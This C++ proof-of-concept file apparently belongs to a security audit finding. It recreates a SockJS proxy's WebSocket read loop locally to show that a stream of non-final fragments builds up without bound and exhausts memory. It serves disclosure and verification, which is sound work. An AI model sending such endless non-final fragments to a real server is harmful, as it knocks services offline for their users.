// PoC for finding 007: src/proxy/sockjssession.cpp:641-665.
//
// In WebSocketFramed mode the read loop runs while `inBytes < BUFFER_SIZE`.
// `inBytes` is incremented only after a *complete* wrapped SockJS message
// has been parsed (line 724), but the per-frame size cap on line 658 only
// restricts a single fragment to `BUFFER_SIZE * 2`. The cumulative size of
// `inWrappedFrames` is *not* checked until a final fragment exists
// (lines 667-675 only run on the `end < inWrappedFrames.count()` path).
//
// An attacker who keeps sending non-final fragments (`more = true`) under
// `BUFFER_SIZE * 2` each, never sending a final fragment, makes the loop
// repeatedly enter the `end >= inWrappedFrames.count()` branch and append
// to `inWrappedFrames` without ever incrementing `inBytes`. Memory use
// grows without bound.
//
// This PoC mirrors the relevant control flow with the same constants the
// vulnerable code uses, simulates a stream of non-final fragments, and
// reports the in-memory accumulation against the loop guard.

#include <cstdio>
#include <cstdint>
#include <vector>
#include <queue>

// Constants from sockjssession.cpp: BUFFER_SIZE is the per-session input
// limit. The proxy uses 200000.
static constexpr int BUFFER_SIZE = 200000;

struct Frame {
    enum Type { Text, Binary, Continuation };
    Type type;
    std::vector<uint8_t> data;
    bool more;
};

// Stand-in for ZWebSocket: an attacker's queue of pending non-final frames.
struct WSocket {
    std::queue<Frame> q;
    int framesAvailable() const { return static_cast<int>(q.size()); }
    Frame readFrame() {
        Frame f = q.front();
        q.pop();
        return f;
    }
};

struct Session {
    int inBytes = 0;
    std::vector<Frame> inWrappedFrames;
    bool error = false;
};

// Mirror of the vulnerable read loop at sockjssession.cpp:641-735, omitting
// branches not exercised by this PoC (everything past the unbounded append).
static void readLoop(Session &s, WSocket &sock) {
    while (s.inBytes < BUFFER_SIZE) {
        int end = 0;
        for (; end < (int)s.inWrappedFrames.size(); ++end) {
            if (!s.inWrappedFrames[end].more)
                break;
        }
        if (end >= (int)s.inWrappedFrames.size()) {
            if (sock.framesAvailable() == 0)
                break;

            Frame f = sock.readFrame();

            // sockjssession.cpp:658 -- only the per-frame size is capped.
            if ((int)f.data.size() > BUFFER_SIZE * 2) {
                s.error = true;
                break;
            }

            // sockjssession.cpp:663 -- unbounded append. inBytes is *not*
            // updated here, only when a full message parses below.
            s.inWrappedFrames.push_back(f);
            continue;
        }

        // We never reach here while every fragment has more==true.
        // (The full-message branch would update inBytes.)
        break;
    }
}

int main() {
    Session s;
    WSocket sock;

    // Each fragment is sized just below the per-frame cap. They are all
    // non-final, so the cumulative-size branch on line 667-675 is never
    // entered. Send as many as we like; only RAM stops us.
    const int per_frame = BUFFER_SIZE * 2;       // 400000
    const int num_frames = 200;                  // ~80 MB total

    for (int i = 0; i < num_frames; ++i) {
        Frame f;
        f.type = (i == 0) ? Frame::Text : Frame::Continuation;
        f.data.assign(per_frame, 'A');
        f.more = true;       // never finalize
        sock.q.push(f);
    }

    readLoop(s, sock);

    long total = 0;
    for (const auto &f : s.inWrappedFrames)
        total += (long)f.data.size();

    std::printf("inWrappedFrames count : %zu\n", s.inWrappedFrames.size());
    std::printf("inWrappedFrames bytes : %ld (%.1f MiB)\n",
                total, total / (1024.0 * 1024.0));
    std::printf("inBytes (loop guard)  : %d\n", s.inBytes);
    std::printf("BUFFER_SIZE           : %d\n", BUFFER_SIZE);
    std::printf("error flag set        : %s\n", s.error ? "true" : "false");

    bool vulnerable =
        !s.error &&
        s.inBytes == 0 &&
        total > BUFFER_SIZE * 10 &&
        (int)s.inWrappedFrames.size() == num_frames;

    if (vulnerable) {
        std::puts("\nRESULT: vulnerable. inWrappedFrames accumulated unbounded fragment");
        std::puts("        bytes while the inBytes < BUFFER_SIZE guard never tripped.");
        std::puts("        A remote SockJS client can sustain this to exhaust worker memory.");
        return 0;
    }

    std::puts("\nRESULT: did not reproduce");
    return 1;
}
